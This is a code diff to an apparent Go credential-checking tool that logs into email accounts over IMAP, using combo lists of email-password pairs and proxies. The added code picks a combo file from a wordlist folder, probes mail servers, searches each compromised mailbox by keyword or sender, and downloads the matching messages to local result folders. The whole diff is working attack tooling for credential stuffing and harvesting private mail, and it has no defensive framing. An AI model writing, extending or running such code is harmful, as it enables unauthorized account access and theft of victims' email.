@@ -5,9 +5,11 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
@@ -61,7 +63,11 @@ func loadIMAPConfig() {
 
 	file, err := ioutil.ReadFile(configFile)
 	if err == nil {
-		json.Unmarshal(file, &imapCache)
+		var tempCache map[string]string
+		json.Unmarshal(file, &tempCache)
+		for k, v := range tempCache {
+			imapCache[strings.ToLower(k)] = v
+		}
 	}
 }
 
@@ -77,17 +83,18 @@ func saveIMAPConfig() {
 // Get or discover IMAP server for a domain
 func getIMAPServer(domain string, subdomains []string, timeout time.Duration) (string, error) {
 	cacheLock.RLock()
-	if server, exists := imapCache[domain]; exists {
+	lowerDomain := strings.ToLower(domain)
+	if server, exists := imapCache[lowerDomain]; exists {
 		cacheLock.RUnlock()
 		if verbose {
-			fmt.Printf("[VERBOSE] Using cached IMAP server: %s -> %s\n", domain, server)
+			fmt.Printf("[KNOWN] LOADED FROM CONFIG IMAP SERVER: %s -> %s\n", domain, server)
 		}
 		return server, nil
 	}
 	cacheLock.RUnlock()
 
 	if verbose {
-		fmt.Printf("[VERBOSE] Discovering IMAP server for domain: %s\n", domain)
+		fmt.Printf("[SCANNING] DISCOVERING IMAP SERVER FOR: %s\n", domain)
 	}
 
 	// Try each subdomain and both ports (143 and 993)
@@ -95,19 +102,19 @@ func getIMAPServer(domain string, subdomains []string, timeout time.Duration) (s
 		for _, port := range []string{"143", "993"} { // Check both ports 143 and 993
 			server := fmt.Sprintf("%s.%s:%s", sub, domain, port) // Try each subdomain with both ports
 			if verbose {
-				fmt.Printf("[VERBOSE] Trying IMAP server: %s\n", server)
+				fmt.Printf("[CONNECTING] TESTING IMAP SERVER: %s\n", server)
 			}
 
 			conn, err := net.DialTimeout("tcp", server, timeout)
 			if err == nil {
 				conn.Close()
 				cacheLock.Lock()
-				imapCache[domain] = server // Save found server
+				imapCache[lowerDomain] = server // Save found server
 				cacheLock.Unlock()
 				saveIMAPConfig()
 
 				if verbose {
-					fmt.Printf("[VERBOSE] Found working IMAP server: %s\n", server)
+					fmt.Printf("[CONNECTED] LOCATED WORKING IMAP SERVER: %s\n", server)
 				}
 				return server, nil
 			}
@@ -115,9 +122,21 @@ func getIMAPServer(domain string, subdomains []string, timeout time.Duration) (s
 	}
 
 	if verbose {
-		fmt.Printf("[VERBOSE] No working IMAP server found for %s\n", domain)
+		fmt.Printf("[NOTFOUND] UNABLE TO LOCATE IMAP SERVER FOR %s\n", domain)
 	}
 	return "", fmt.Errorf("no IMAP server found for %s", domain)
+}
+
+// Save email message to file
+func saveEmailMessage(email, subject, body, keyword, sender string, timestamp time.Time) {
+	dir := fmt.Sprintf("./results/%s/%s", keyword, email)
+	if sender != "" {
+		dir = fmt.Sprintf("./results/%s/%s", sender, email)
+	}
+	os.MkdirAll(dir, os.ModePerm)
+
+	filename := fmt.Sprintf("%s/%d_%s.html", dir, timestamp.Unix(), strings.ReplaceAll(subject, " ", "_"))
+	ioutil.WriteFile(filename, []byte(body), 0644)
 }
 
 // Authenticate and check IMAP using correct response validation
@@ -219,16 +238,60 @@ func checkIMAP(email, password, server string, proxyDialer proxy.Dialer, timeout
 	if keyword != "" || sender != "" {
 		criteria := imap.NewSearchCriteria()
 		if keyword != "" {
-			criteria.Body = []string{keyword}
+			criteria.Body = []string{keyword} // Searches email body
 		}
 		if sender != "" {
-			criteria.Header = map[string][]string{"From": {sender}}
+			criteria.Header = map[string][]string{"From": {"*" + sender + "*"}} // Use wildcard for better matching
 		}
-		results, _ := imapClient.Search(criteria)
-		matchingMessages = len(results)
+		results, err := imapClient.Search(criteria)
+
+		if err != nil {
+			if verbose {
+				fmt.Printf("[VERBOSE] IMAP search failed: %s\n", err)
+			}
+			return false, inboxCount, sentCount, 0
+		}
+		matchingMessages := len(results)
 
 		if verbose {
 			fmt.Printf("[VERBOSE] Found %d matching messages for keyword/sender search.\n", matchingMessages)
+		}
+
+		// Download matching messages
+		if matchingMessages > 0 {
+			seqset := new(imap.SeqSet)
+			seqset.AddNum(results...)
+			messages := make(chan *imap.Message, 10)
+			done := make(chan error, 1)
+			go func() {
+				done <- imapClient.Fetch(seqset, []imap.FetchItem{imap.FetchEnvelope, imap.FetchBody}, messages)
+			}()
+
+			for msg := range messages {
+				if msg.Envelope != nil {
+					subject := msg.Envelope.Subject
+					timestamp := msg.Envelope.Date
+					body := ""
+					for _, section := range msg.Body {
+						buf := new(strings.Builder)
+						_, err := io.Copy(buf, section)
+						if err != nil {
+							if verbose {
+								fmt.Printf("[VERBOSE] Failed to read message body: %s\n", err)
+							}
+						}
+						body = buf.String()
+
+					}
+					saveEmailMessage(email, subject, body, keyword, sender, timestamp)
+				}
+			}
+
+			if err := <-done; err != nil {
+				if verbose {
+					fmt.Printf("[VERBOSE] Failed to fetch messages: %s\n", err)
+				}
+			}
 		}
 	}
 
@@ -266,6 +329,30 @@ func main() {
 
 	// Set verbose mode
 	verbose = *verboseFlag
+
+	// If -c is not provided, list .txt files in ./wordlist and prompt user to choose
+	if *comboPath == "" {
+		files, err := filepath.Glob(filepath.Join(wordlistDir, "*.txt"))
+		if err != nil || len(files) == 0 {
+			fmt.Println("No .txt files found in ./wordlist directory.")
+			return
+		}
+
+		fmt.Println("Select a combo file:")
+		for i, file := range files {
+			fmt.Printf("[%d] %s\n", i+1, file)
+		}
+
+		var choice int
+		fmt.Print("Enter the number of your choice: ")
+		_, err = fmt.Scan(&choice)
+		if err != nil || choice < 1 || choice > len(files) {
+			fmt.Println("Invalid choice.")
+			return
+		}
+
+		*comboPath = files[choice-1]
+	}
 
 	// Handle proxy path defaulting to ./src/proxies.txt if -p is used without a specified path
 	useProxy := false
